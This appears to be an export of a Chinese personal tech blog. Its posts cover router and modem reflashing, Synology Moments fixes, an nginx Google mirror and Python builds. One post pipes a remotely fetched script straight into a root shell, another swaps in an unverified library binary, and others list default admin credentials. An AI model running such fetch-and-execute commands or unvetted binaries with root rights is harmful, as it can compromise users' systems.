<h1 id="客户端命令行使用"><a href="#客户端命令行使用" class="headerlink" title="客户端命令行使用"></a>客户端命令行使用</h1><p>首先安装 <code>OpenVPN</code>, 运行时选择配置为客户端配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo openvpn --config client-woodenrobot.ovpn</span><br></pre></td></tr></table></figure>
<p>使用此方法可以让家里的电脑或者树莓派等设备实现内网穿透，从而远程连接进行操作。<br><strong>注：该方法只有连接内网机器时会使用 OpenVPN 代理，平时访问网页等不会走代理，并不是全局代理，节省服务带宽的使用</strong>  </p>
<hr>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://xlzd.me/2016/10/10/openvpn/">怎样在 Ubuntu 16.04 上安装 OpenVPN 服务</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04">How To Set Up an OpenVPN Server on Ubuntu 16.04</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>OpenVPN</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu14.04 phpMyAdmin的安装及配置</title>
    <url>/2016/07/15/Ubuntu14-04-phpMyAdmin%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>首先<code>ctrl+alt+t</code>打开终端，输入下列代码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo apt-get install phpmyadmin</span><br></pre></td></tr></table></figure>
<p>等待安装成功后，在终端继续输入下列代码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/share/phpmyadmin/ /var/www/html</span><br></pre></td></tr></table></figure>
<p>这是因为系统在安装软件时，默认将软件安装在了/usr/share/下，我们需要将phpmyadmin文件夹和/var/www/html建立联系。<br>接着打开浏览器输入<a href="http://localhost/"></a>,如果出现下图说明安装成功可以使用。<br><img src="/images/phpmyadmin1.png"><br>但是我在安装后出现了<a href="http://localhost/"></a>无法打开的问题，经过一番研究发现通过下列方法可以解决。<br>首先在终端里输入：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure>
<p>如果你的这个文件（文件一般为空的）中加入<code>ServerName  localhost:80</code>保存并退出。<br>重新打开<a href="http://localhost/"></a>，出现上图。<br>接着打开<a href="http://localhost/phpmyadmin/"></a>（ps:别忘了启动MySQL服务），出现下图情形，输入你的MySQL账号密码即可使用MySQL可视化工具进行操作。<br><img src="/images/phpmyadmin2.png"></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>优酷路由宝 YK-L1c 和 YK-L1 刷入 Breed 不死和 hiboy Padavan 固件</title>
    <url>/2020/04/04/YK-L1c/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前买了一个优酷路由宝 YK-L1c 在此记录一下刷机过程。最近又买了一个 YK-L1 发现刷机固件两个是通用的。</p>
<span id="more"></span>

<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>待刷优酷路由宝 YK-L1c 或者 YK-L1 一台  </li>
<li>刷机breed：<a href="https://github.com/Wooden-Robot/documents-for-fun/blob/master/%E4%BC%98%E9%85%B7%E8%B7%AF%E7%94%B1%E5%AE%9DYK-L1c/breed-mt7620-youku-yk1.bin">breed-mt7620-youku-yk1.bin</a></li>
<li>降级并获取root权限固件：<a href="https://github.com/Wooden-Robot/documents-for-fun/blob/master/%E4%BC%98%E9%85%B7%E8%B7%AF%E7%94%B1%E5%AE%9DYK-L1c/Youku-L1c-0818-root.bin">Youku-L1c-0818-root.bin</a></li>
<li>老毛子 Pandavan 固件：<a href="https://github.com/Wooden-Robot/documents-for-fun/blob/master/%E4%BC%98%E9%85%B7%E8%B7%AF%E7%94%B1%E5%AE%9DYK-L1c/RT-N14U-GPIO-1-youku1-128M_3.4.3.9-099.trx">RT-N14U-GPIO-1-youku1-128M_3.4.3.9-099.trx</a></li>
</ul>
<p>最新版的老毛子固件和 Breed 大家可以自行去下载，上述版本也可以使用，没有任何问题。</p>
<ul>
<li>老毛子固件下载地址：<a href="http://opt.cn2qq.com/padavan/">http://opt.cn2qq.com/padavan/</a></li>
<li>Breed 下载地址：<a href="https://breed.hackpascal.net/">https://breed.hackpascal.net/</a></li>
</ul>
<h2 id="降级并获得root权限"><a href="#降级并获得root权限" class="headerlink" title="降级并获得root权限"></a>降级并获得root权限</h2><p>注意，用网线将PC连接路由宝，登录管理WEB页面 <a href="http://wifi.youku.com.或者默认的/">http://wifi.youku.com。或者默认的</a> 192.168.11.1</p>
<p>步骤：更多设置——系统升级——手动升级——上传固件，上传的固件即为 <code>Youku-L1c-0818-root.bin</code>。 升级过程中不要中断路由宝与PC的连接，也不要中途断电。升级完成后路由器会重启，重启过程中耐心等待。</p>
<h2 id="刷入-Breed"><a href="#刷入-Breed" class="headerlink" title="刷入 Breed"></a>刷入 Breed</h2><p>刷完第一步的固件后，实际上也已经 root 了，用户名：root 密码：admin </p>
<p><em>Ps: 密码不对的话就在路由器开机状态下长按路由器后面的 <code>Reset</code> 键重置路由器就可以了。</em></p>
<p>首先上传 breed 固件到路由器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp breed-mt7620-youku-yk1.bin root@192.168.11.1:/tmp</span><br></pre></td></tr></table></figure>

<p>然后登录路由器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.11.1</span><br></pre></td></tr></table></figure>

<p>在路由器 shell 中输入下列命令输入 breed:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mtd write /tmp/breed-mt7620-youku-yk1.bin Bootloader</span><br></pre></td></tr></table></figure>

<h2 id="使用-Breed-刷入老毛子"><a href="#使用-Breed-刷入老毛子" class="headerlink" title="使用 Breed 刷入老毛子"></a>使用 Breed 刷入老毛子</h2><p>路由断电后按住 reset 键，后通电，指示灯全闪后等 2 秒松开 reset 键，进入 Breed 管理界面 <a href="http://192.168.1.1/">http://192.168.1.1</a> ，选择固件更新，使用 <code>RT-N14U-GPIO-1-youku1-128M_3.4.3.9-099.trx</code> 刷入老毛子。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.znds.com/tv-488200-1-1.html">优酷路由宝降级图文教程【附固件】_智能路由器论坛_ZNDS</a></li>
<li><a href="https://www.znds.com/tv-488210-1-1.html">优酷路由宝第三方刷机图文教程+工具+固件_智能路由器论坛_ZNDS</a></li>
<li><a href="https://www.sqyai.com/post-562.html">优酷土豆路由宝 YK-L1c 刷机过程 - 生活杂谈 - 情醉中国风</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Padavan</tag>
      </tags>
  </entry>
  <entry>
    <title>Zoom 直播分享 Awesome pipeline 录像和资料下载</title>
    <url>/2020/04/02/awesome-pipeline/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周末在赖信涛的邀请下，分享了 iredis 中 shell pipeline 实现的相关故事。第一次分享有点小紧张，提前好几天一直在准备 PPT 生怕自己讲不好，还好有惊无险完成了整个分享。这次分享主要由 iredis 的作者赖信涛和两位开发者 rhchen 和我通过 Zoom 的形式参与，内容辛姐帮我们录像上传到了 YouTube 和 B 站。</p>
<span id="more"></span>

<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
    <iframe src="//player.bilibili.com/player.html?aid=795073416&bvid=BV1BC4y147P6&cid=172197296&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> 
    </iframe>
</div>

<ul>
<li>YouTube 视频链接： <a href="https://youtu.be/EFwGK3Lvr04">https://youtu.be/EFwGK3Lvr04</a></li>
<li>B 站视频链接： <a href="https://www.bilibili.com/video/BV1BC4y147P6/">https://www.bilibili.com/video/BV1BC4y147P6/</a></li>
<li>IRedis项目：<a href="https://github.com/laixintao/iredis">https://github.com/laixintao/iredis</a></li>
<li>项目主页：<a href="https://www.iredis.io/">https://www.iredis.io/</a></li>
</ul>
<p>分享中提到的内容，以及分享的 slide，在下文 github 上可以找到。</p>
<h2 id="三个演讲的大纲和PPT"><a href="#三个演讲的大纲和PPT" class="headerlink" title="三个演讲的大纲和PPT"></a>三个演讲的大纲和PPT</h2><h3 id="赖信涛：awesome-commandline"><a href="#赖信涛：awesome-commandline" class="headerlink" title="赖信涛：awesome commandline"></a>赖信涛：awesome commandline</h3><p>slide: <a href="https://github.com/laixintao/myslides/tree/master/awesome-commandline">https://github.com/laixintao/myslides/tree/master/awesome-commandline</a></p>
<ol>
<li>为什么命令行更加高效（演示demo，vim+tmux+shell命令可以互相配合）</li>
<li>大部分时间我们都在和 Vim，终端相处，但是日常的开发工作还离不开另一个角色：REPL</li>
<li>所以我们需要更好的命令行的REPL：mycli/pgcli/iredis</li>
<li>如何开发这样的工具？</li>
<li>开发理念？</li>
<li>What next？</li>
</ol>
<h3 id="WoodenRobot-awesome-pipeline-Ps-也就是我啦"><a href="#WoodenRobot-awesome-pipeline-Ps-也就是我啦" class="headerlink" title="WoodenRobot: awesome-pipeline(Ps: 也就是我啦)"></a>WoodenRobot: awesome-pipeline(Ps: 也就是我啦)</h3><p>slide: <a href="https://github.com/Wooden-Robot/myslides/">https://github.com/Wooden-Robot/myslides/</a></p>
<p>协助开发 iredis pipeline feature 的始末<br>shell 的 pipeline原理，常用操作<br>python 的 subprocess 接口<br>如何参与开源项目</p>
<h3 id="rhchen-awesome-BNF"><a href="#rhchen-awesome-BNF" class="headerlink" title="rhchen:awesome-BNF"></a>rhchen:awesome-BNF</h3><p>slide: <a href="https://github.com/laixintao/myslides/tree/master/bnf-by-rhchen">https://github.com/laixintao/myslides/tree/master/bnf-by-rhchen</a></p>
<p>什么是 BNF，为什么要用它，能用它做什么？(编译原理的实践应用)<br>针对 iRedis 的解析需求, 如何设计 BNF? (处理”未输入完全”的字符串)<br>使用 SLY 解析输入和 iRedis 当前的解析方式的不同点比较</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>分享</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 使用 Brew 升级 openssl@1.1 问题</title>
    <url>/2020/01/11/brew-openssl-python/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>使用 <code>brew</code>升级 <code>openssl</code> 后打开 <code>zsh shell</code> 后遇到下面报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> md5 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> md5</span><br><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> sha1 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> sha1</span><br><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> sha224 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> sha224</span><br><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> sha256 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> sha256</span><br><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> sha384 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> sha384</span><br><span class="line">ERROR:root:code <span class="keyword">for</span> <span class="built_in">hash</span> sha512 was not found.</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 147, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    globals()[__func_name] = __get_hash(__func_name)</span><br><span class="line">  File <span class="string">&quot;/usr/local/Cellar/python@2/2.7.15_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/hashlib.py&quot;</span>, line 97, <span class="keyword">in</span> __get_builtin_constructor</span><br><span class="line">    raise ValueError(<span class="string">&#x27;unsupported hash type &#x27;</span> + name)</span><br><span class="line">ValueError: unsupported <span class="built_in">hash</span> <span class="built_in">type</span> sha512</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew reinstall python@2</span><br></pre></td></tr></table></figure>

<p>如果其他版本的 Python 也出现无法使用的情况请重新安装一次。例如使用 <code>pyenv</code> 安装的 python 需要使用下列命令重新安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv install -f 3.6.3</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://github.com/wting/autojump/issues/540">hash md5 error on Mac · Issue #540 · wting/autojump · GitHub</a></li>
<li><a href="https://stackoverflow.com/questions/59269208/errorrootcode-for-hash-md5-was-not-found-not-able-to-use-any-hg-mercurial-co">python - ERROR:root:code for hash md5 was not found - not able to use any hg mercurial commands - Stack Overflow</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title>中兴 ZXHN F677V2 光猫改桥接</title>
    <url>/2019/08/26/bridge/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>家里用蜗牛星际组装了一个黑群晖，之前用 Zerotier-one 做内网穿透从外网连接到群晖，后来发现 Zertier-one 的 <code>P2P</code> 的成功率很低，速度很慢，看了一下光猫发现宽带有公网 IP，于是更换光猫为桥接模式，使用路由器拨号上网，路由器做端口转发，直接通过公网 IP 连接群晖，在此记录一下 中兴 ZXHN F677V2 光猫改桥接的方法。Ps: 淘宝要几十块，穷就自己动手啦 : )</p>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><ol>
<li><p>连接路由器的网络，访问 <a href="http://192.168.1.1/cu.html">http://192.168.1.1/cu.html</a>；</p>
</li>
<li><p>输入超级管理员密码进入超级管理员后台，密码默认为：<code>CUAdmin</code>(Ps: 我是打装宽带的师傅电话要的，不对的话可以问师傅要);</p>
</li>
<li><p>在基本配置中选择上行线路配置，记录名为 <code>x_INTERNET_R_VID_y</code> 原本 <code>PPPoE</code> 模式中的配置信息，特别是 <code>VLAN ID</code> 值（Ps: x和y的值每个人可能不一样）</p>
</li>
<li><p>添加一个新的 <code>Bridge</code> 模式的连接，除了模式之前其他的配置设置为和之前 <code>PPPoE</code> 模式相同，切记 <code>VLAN ID</code> 值一定要相同；</p>
</li>
<li><p>删除原来的两个连接，一个是 <code>x_TR069_R_VID_y</code>，一个是 <code>x_INTERNET_R_VID_y</code>。</p>
</li>
<li><p>路由器使用原本的宽带账号密码拨号上网即可；</p>
</li>
<li><p>如果拨号后连接不成功，可以关闭光猫几分钟再开启进行尝试。</p>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.v2ex.com/t/583187">[求助] 联通光猫 ZXHN F477V2 桥接问题</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>群晖 Moments 人物识别一键修复解决方案</title>
    <url>/2021/02/11/easy-moments/</url>
    <content><![CDATA[<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>首先 SSH 登录群晖并进入 root 用户下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<p>执行下列一键安装脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(wget -O- https://raw.githubusercontent.com/Wooden-Robot/documents-for-fun/master/Synology/moments_ai_patch.sh)&quot; -p install</span><br></pre></td></tr></table></figure>

<p>安装后重新启动 <code>Moments</code> 并<code>全部重建索引</code>。</p>
<p>卸载补丁执行下列命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(wget -O- https://raw.githubusercontent.com/Wooden-Robot/documents-for-fun/master/Synology/moments_ai_patch.sh)&quot; -p uninstall</span><br></pre></td></tr></table></figure>

<p><strong>如果无法使用上面的 github 脚本！请关注公众号：<code>WoodenRobot</code> 回复 <code>moments</code>  获取国内安装和卸载命令！</strong></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>群晖</tag>
      </tags>
  </entry>
  <entry>
    <title>修复黑群晖 Moments 1.3.3-0700 版本人物识别不能使用问题</title>
    <url>/2019/09/26/fix-moments/</url>
    <content><![CDATA[<ol>
<li>下载 <a href="https://github.com/Wooden-Robot/documents-for-fun/raw/master/%E7%BE%A4%E6%99%96%20Synology%20DSM/libsynophoto-plugin-detection.so">libsynophoto-plugin-detection.so</a> 文件</li>
<li>SSH 登录群晖，并登录 root 账号</li>
<li>备份原文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mv /var/packages/SynologyMoments/target/usr/lib/libsynophoto-plugin-detection.so /var/packages/SynologyMoments/target/usr/lib/libsynophoto-plugin-detection.so.bak</span><br></pre></td></tr></table></figure></li>
<li>将刚刚下载的文件放到 <code>/var/packages/SynologyMoments/target/usr/lib/</code> 路径下</li>
<li>重启 Moments 并重新创建索引。</li>
</ol>
<p><strong><em>注： 修复 bug 的 <code>libsynophoto-plugin-detection.so</code> 文件来源于 1.2.1-0646 版本的 Moments</em></strong></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://xpenology.com/forum/topic/20105-fix-the-problem-of-moments-13x-face-recognition-not-work/?tab=comments#comment-118808">Fix the problem of moments 1.3.x face recognition NOT work - Synology Packages - XPEnology Community</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>群晖</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 搭建 Google 镜像站</title>
    <url>/2019/08/26/google/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在公司科学上网使用谷歌经常出现很长一段时间访问不了，严重影响工作效率，没办法只能自己搭建一个镜像网站。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>机房：搬瓦工</li>
<li>系统：Ubuntu 18.04</li>
</ul>
<h2 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install nginx</span></span><br></pre></td></tr></table></figure>
<h2 id="增加-nginx-配置"><a href="#增加-nginx-配置" class="headerlink" title="增加 nginx 配置"></a>增加 nginx 配置</h2><p>在 <code>/etc/nginx/sites-enabled</code> 文件夹内新增 <code>google.conf</code> 配置文件，配置文件内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name www.example.com;</span><br><span class="line"> </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass https://www.google.com/;</span><br><span class="line"> </span><br><span class="line">        proxy_redirect https://www.google.com/ /;</span><br><span class="line">        proxy_cookie_domain google.com www.example.com;</span><br><span class="line"> </span><br><span class="line">        proxy_set_header User-Agent $http_user_agent;</span><br><span class="line">        proxy_set_header Cookie &quot;PREF=ID=047808f19f6de346:U=0f62f33dd8549d11:FF=2:LD=zh-CN:NW=1:TM=1325338577:LM=1332142444:GM=1:SG=2:S=rE0SyJh2W1IQ-Maw&quot;;</span><br><span class="line">        # 这里设置cookie，这里是别人给出的一段，必要时请放上适合你自己的cookie</span><br><span class="line">        # 设置这个可以避免一些情况下的302跳转，如果google服务器返回302 redirect，那么浏览器被跳转到google自己的域名，那就没的玩了</span><br><span class="line"> </span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"> </span><br><span class="line">        subs_filter  http://www.google.com http://www.example.com;</span><br><span class="line">        subs_filter  https://www.google.com http://www.example.com;</span><br><span class="line">        # 这里替换网页中的链接，因为我们的镜像站是http的，所以上面顺便把协议也一起替换了</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong><em>注：请手动更改配置中的 <a href="http://www.example.com/">www.example.com</a> 为自己的域名地址</em></strong></p>
<h2 id="载入配置"><a href="#载入配置" class="headerlink" title="载入配置"></a>载入配置</h2><p>使用下列命令重新载入配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nginx -s reload</span><br></pre></td></tr></table></figure>

<h2 id="添加-DNS-解析记录"><a href="#添加-DNS-解析记录" class="headerlink" title="添加 DNS 解析记录"></a>添加 DNS 解析记录</h2><p>将自己的域名添加一条指向该台服务器 IP 的 DNS 解析记录，访问域名即可实现访问谷歌。</p>
<h2 id="增加-Basic-Auth-认证"><a href="#增加-Basic-Auth-认证" class="headerlink" title="增加 Basic Auth 认证"></a>增加 Basic Auth 认证</h2><p>如果不想自己的谷歌镜像被别人乱用，可以增加 Basic Auth 来限制其他人使用。</p>
<h3 id="生成密码"><a href="#生成密码" class="headerlink" title="生成密码"></a>生成密码</h3><p>使用下列命令生成密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;your_username:<span class="subst">$(openssl passwd -crypt your_password)</span>\n&quot;</span> &gt;&gt; /etc/nginx/conf.d/passwd</span></span><br></pre></td></tr></table></figure>
<h3 id="配置-Nginx"><a href="#配置-Nginx" class="headerlink" title="配置 Nginx"></a>配置 Nginx</h3><p>用 vim 修改刚刚的配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/nginx/sites-enabled/google.conf</span></span><br></pre></td></tr></table></figure>
<p>增加下列内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">        auth_basic &quot;Hello World&quot;;</span><br><span class="line">        auth_basic_user_file conf.d/passwd;</span><br><span class="line"></span><br><span class="line">        proxy_pass https://www.google.com/;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然后 <code>nginx -s reload</code> 重启 Nginx 生效。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://blog.stdio.io/689">Nginx 搭建 Google 镜像站
</a></li>
<li><a href="https://segmentfault.com/a/1190000004694935">为 Nginx 添加 HTTP 基本认证(HTTP Basic Authentication)</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>去除 iTerm2 下 Tmux 复制模式警告</title>
    <url>/2020/07/07/iterm2-tmux/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>iTerm2  3.3.11</li>
<li>Tmux  3.1b</li>
</ul>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><img src="/images/iterm2-tmux.png" alt="tmux.png"></p>
<p>如图所示，在 iTerm2 中使用 Tmux 的复制模式就会报错。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ defaults write com.googlecode.iterm2 NoSyncNeverAskAboutMouseReportingFrustration -bool <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://gitlab.com/gnachman/iterm2/-/issues/8905">Annoying banner: “Looks like you’re trying to copy to the pasteboard…” (#8905) · Issues · George Nachman / iterm2 · GitLab</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux通过源码编译安装 Python3.8</title>
    <url>/2020/01/09/linux-install-python/</url>
    <content><![CDATA[<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><ul>
<li>Ubuntu/Debian:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev python-openssl git</span><br></pre></td></tr></table></figure></li>
<li>Fedora/CentOS/RHEL(aws ec2):<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo yum install @development zlib-devel bzip2 bzip2-devel readline-devel sqlite \</span><br><span class="line">sqlite-devel openssl-devel xz xz-devel libffi-devel findutils</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="下载-Python3-8-源码包"><a href="#下载-Python3-8-源码包" class="headerlink" title="下载 Python3.8 源码包"></a>下载 Python3.8 源码包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl -O https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz</span><br></pre></td></tr></table></figure>

<h2 id="编译安装-Python3-8"><a href="#编译安装-Python3-8" class="headerlink" title="编译安装 Python3.8"></a>编译安装 Python3.8</h2><p>首先解压源码包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tar -Jxvf Python-3.8.1.tar.xz</span><br></pre></td></tr></table></figure>
